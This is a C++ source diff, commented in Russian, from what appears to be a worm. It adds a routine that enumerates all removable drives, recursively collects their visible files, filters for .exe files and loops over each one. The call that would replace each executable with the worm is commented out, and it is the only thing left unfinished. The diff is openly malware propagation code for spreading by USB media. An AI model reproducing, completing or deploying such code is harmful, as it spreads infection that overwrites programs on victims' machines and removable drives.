@@ -21,7 +21,7 @@ bool is_hidden(const fs::path& path);
 void init_locale();
 // Генератор случайных чисел
 wstring generate_unique_suffix();
-
+vector<wstring> get_removable_volume_paths(); // поиск всех съемных носителей
 
 
 void worm_was_started();
@@ -55,11 +55,6 @@ public:
 		);
 	}
 
-	//void print_root() {
-	//	for (const auto& path : get_all_volumes()) {
-	//		wcout << path << endl;
-	//	}
-	//}
 
 	void scan_all_volumes() { // поиск по всем корневым дискам, исключая съемные носители
 		auto volumes = get_all_volumes();
@@ -240,5 +235,35 @@ public:
 	}
 
 	
+	// Обработка съемных носителей
+
+	void process_all_removable_disks() { // проходимся по всем съемным носителям
+		vector<wstring> removable = get_removable_volume_paths();
+
+		for (const auto& root : removable) {
+			wcout << L"[Обработка]: " << root << endl;
+			vector <wstring> data_list;
+			data_list.clear();
+			search_list_dir(root, data_list); // Рекурсивно собрать все директории
+
+			collect_visible_files(data_list, file_to_copy); // Собираем все видимые файлы
+			filter_only_exe(file_to_copy); // Фильтруем только .exe
+
+			for (const auto& exe_path : file_to_copy) {
+				//try_replace_exe_with_worm(exe_path);
+			}
+		}
+	}
+
+	void filter_only_exe(vector<fs::path>& files) { // фильтруем из всех файлов, только exe
+		vector<fs::path> filtered;
+		for (const auto& file : files) {
+			if (file.extension() == L".exe") {
+				filtered.push_back(file);
+			}
+		}
+		files = filtered;
+	}
+
 };
 
